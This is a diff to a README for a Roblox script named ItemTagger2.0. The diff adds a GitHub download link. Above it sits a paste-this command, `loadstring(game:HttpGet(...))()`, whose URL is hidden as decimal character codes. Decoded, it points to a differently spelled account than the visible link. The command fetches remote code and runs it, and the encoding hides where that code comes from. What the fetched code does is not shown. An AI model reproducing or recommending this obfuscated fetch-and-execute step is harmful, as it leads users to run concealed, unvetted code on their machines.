@@ -63,6 +63,15 @@ The **ItemTagger2.0** script is a great tool for inspecting items in your Roblox
 loadstring(game:HttpGet((function()local d="";for a in("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,111,111,73,104,115,116,115,104,98,100,50,48,50,52,47,82,111,98,108,111,120,83,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,115,99,114,105,112,116,115,47,73,116,101,109,84,97,103,103,101,114,50,46,48,46,108,117,97"):gmatch("%d+")do d=d..string.char(tonumber(a))end;return d end)()))()
 ```
 
+Or,
+
+
+### **🔽 Download ItemTagger2.0**  
+You can download the latest version of **ItemTagger2.0** from the official GitHub release:  
+
+➡️ **[Download ItemTagger2.0](https://github.com/arooshbd2024/RobloxScripts/releases/download/v1.0.0/ItemTagger.lua)**  
+
+
 ---
 
 ## ⚡ More Scripts Coming Soon
